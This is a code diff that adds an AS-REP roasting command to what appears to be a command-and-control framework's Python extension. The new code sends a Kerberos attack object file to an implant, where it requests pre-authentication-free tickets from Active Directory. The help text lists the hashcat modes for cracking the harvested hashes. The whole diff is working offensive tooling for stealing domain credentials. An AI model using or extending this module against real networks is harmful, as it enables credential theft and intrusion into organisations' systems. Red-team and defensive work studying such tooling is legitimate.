@@ -331,6 +331,54 @@ def kerberoast( demonID, *param ):
 
     return TaskID
 
+def asreproast( demonID, *param ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer : Packer = Packer()
+
+    command : str   = "asreproast"
+    arg3    : str   = ""
+    arg4    : str   = ""
+
+    demon = Demon( demonID )
+
+    username = ""
+    etype = "23"
+    i = 0
+    while i < len(param):
+        p = param[i]
+        if p in ("--etype", "-e") and i + 1 < len(param):
+            v = param[i + 1]
+            if v in ("17", "18", "23"):
+                etype = v
+            else:
+                demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid etype: " + v + " (use 17, 18, or 23)" )
+                return
+            i += 2
+            continue
+        if p.startswith("--etype=") or p.startswith("-e="):
+            v = p.split("=", 1)[1]
+            if v in ("17", "18", "23"):
+                etype = v
+            else:
+                demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid etype: " + v + " (use 17, 18, or 23)" )
+                return
+        elif not p.startswith("-"):
+            username = p
+        i += 1
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to execute asreproast" )
+
+    packer.addstr( command )
+    packer.addstr( username )
+    packer.addstr( etype )
+    packer.addstr( arg3 )
+    packer.addstr( arg4 )
+
+    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )
+
+    return TaskID
+
 #RegisterCommand( luid, "", "luid", "get current logon ID", 0, "", "" )
 #RegisterCommand( klist, "", "klist", "list Kerberos tickets", 0, "[/luid <0x0> | /all]", "" )
 #RegisterCommand( dump, "", "dump", "dump Kerberos tickets", 0, "[/luid <0x0> | /all]", "" )
@@ -366,3 +414,30 @@ KERBEROAST_HELP = (
 )
 
 RegisterCommand( kerberoast, "", "kerberoast", KERBEROAST_HELP, 0, "[<username> | <service>/<host>[:port] [username]]", "jnovoa" )
+
+ASREPROAST_HELP = (
+    "ASREPRoasting: request an AS-REP without preauthentication from the KDC\n"
+    "and emit the encrypted enc-part as a crackable hash. Requires the target\n"
+    "account to have 'Do not require Kerberos preauthentication' set.\n"
+    "\n"
+    "USAGE:\n"
+    "  asreproast\n"
+    "      Enumerate all AS-REP-roastable users via LDAP and roast each.\n"
+    "  asreproast <username>\n"
+    "      Roast one named account (RC4 default).\n"
+    "  asreproast <username> --etype 17|18|23\n"
+    "      Explicitly request AES128 (17) / AES256 (18) / RC4 (23).\n"
+    "      RC4 is often disabled in modern AD; use --etype 18 if the KDC\n"
+    "      returns ETYPE_NOSUPP.\n"
+    "\n"
+    "EXAMPLES:\n"
+    "  asreproast jnovoa\n"
+    "  asreproast jnovoa --etype 18\n"
+    "\n"
+    "HASHCAT MODES by encryption type:\n"
+    "  RC4 (etype 23)         -> mode 18200\n"
+    "  AES128 (etype 17)      -> mode 32100\n"
+    "  AES256 (etype 18)      -> mode 32200"
+)
+
+RegisterCommand( asreproast, "", "asreproast", ASREPROAST_HELP, 0, "[<username>] [--etype 17|18|23]", "jnovoa --etype 18" )
